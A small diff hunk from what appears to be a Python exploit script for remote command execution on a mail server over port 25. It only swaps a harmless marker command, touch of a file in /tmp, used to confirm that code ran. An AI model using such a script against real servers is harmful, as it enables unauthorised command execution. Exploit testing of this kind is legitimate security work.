@@ -26,7 +26,7 @@ def auth(tube, command):
 
 
 isEnd = False
-def execute_command(try_addr, command="/usr/bin/touch /tmp/success"):
+def execute_command(try_addr, command="/usr/bin/touch /tmp/iyoooo"):
     global ip
     context.log_level='warning'
     s = remote(ip, 25)
